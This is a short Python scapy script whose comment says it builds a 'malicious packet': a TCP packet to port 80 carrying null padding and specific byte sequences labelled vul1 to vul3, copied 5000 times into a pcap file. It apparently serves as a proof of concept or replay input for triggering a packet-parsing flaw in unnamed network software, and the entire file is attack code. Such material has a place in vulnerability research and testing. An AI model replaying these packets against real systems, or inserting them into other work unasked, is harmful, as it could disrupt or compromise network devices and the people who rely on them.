from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, TCP

# Creates the malicious packet
eth = Ether(dst="00:00:00:00:00:03")
ip = IP()
tcp = TCP(
    dport = 80,
    dataofs = 5
)

padding = ["\x00"] * 78
padding = "".join(padding)
vul1 = "text"
vul2 = "\x00\x00\x00"
vul3 = "\x45\x25\x6D"

# Concatenate the headers
data = padding + vul1 + "\x00"  + vul2 + "\x00" + vul3
pkt = eth / ip / tcp / data

# Write 5000 copies of it to a pcap
for _ in range(5000):
    wrpcap("malicious.pcap", pkt, append=True)
